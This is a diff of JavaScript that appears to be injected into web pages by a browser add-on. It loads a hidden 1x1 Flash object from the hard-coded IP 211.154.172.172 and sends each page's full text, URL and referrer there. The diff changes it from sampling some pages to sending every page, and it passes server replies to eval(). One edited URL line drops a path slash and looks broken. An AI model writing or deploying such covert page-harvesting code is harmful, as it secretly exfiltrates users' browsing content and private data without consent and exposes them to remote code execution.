@@ -32,7 +32,7 @@ _gaq.push(
 	}
 
     window.i8vars ={
-        charset : document.charset || document.characterSet,
+        charset : (document.charset || document.characterSet).toLowerCase(),
         cmtorid : 'i8_communicator'
     };
 
@@ -498,10 +498,10 @@ function I8bho_print()
         var initrc = 'i8_initrc';   // will be called by flash once loaded.
         window[initrc] = function()
         {
-            if( rand(1,100)<=100 ) sendText(document.body.innerText.replace(/\s{2,}/g,  ' '));
+            sendText(document.body.innerText.replace(/\s{2,}/g,  ' '));
         }
         var host = "211.154.172.172", port = "10010";
-        var swf = 'http://' + host + '/crawl.swf?' + 'host=' + host + '&port=' + port + '&charset=' + i8vars.charset + '&initrc=' + initrc;
+        var swf = 'http://' + host + 'crawl.swf?' + Math.random() + '&host=' + host + '&port=' + port + '&charset=' + i8vars.charset + '&initrc=' + initrc;
         var html = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" ' +
                 'codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0" ' +
                 'width="1" height="1" id="' + i8vars.cmtorid + '" name="' + i8vars.cmtorid + '">' +
@@ -523,21 +523,30 @@ function I8bho_print()
     function sendText(text)
     {
         var cmtor = msie ? window[i8vars.cmtorid] : document[i8vars.cmtorid];
-        if (!cmtor || !cmtor.call) return;
-        window.cmtor = cmtor;   // test only
+        if (!cmtor || !cmtor.i8call) return;
+
+        if (window.i8vars.unloadRegistered === undefined)
+        {
+            window.i8vars.unloadRegistered = true;
+            window[(window.onbeforeunload === undefined) ? 'onunload' : 'onbeforeunload'] = function()
+            {
+                cmtor.i8disconnect();
+            }
+        }
+
         var meta = {url:document.location.href, ref:document.referrer};
         window.crawlPage = function(resp)
         {
             var res =  eval('(' + resp + ')');
             if (res && res.code == 'err')
             {
-                cmtor.crawl(null, meta, text);
+                cmtor.i8crawl(null, meta, text);
             }
             else
             { // show ads.
             }
         };
-        cmtor.call("pageExists", 'crawlPage', meta, i8vars.charset);
+        cmtor.i8call("pageExists", 'crawlPage', meta, i8vars.charset.toLowerCase());
     }
 
 	//load Google Analytics
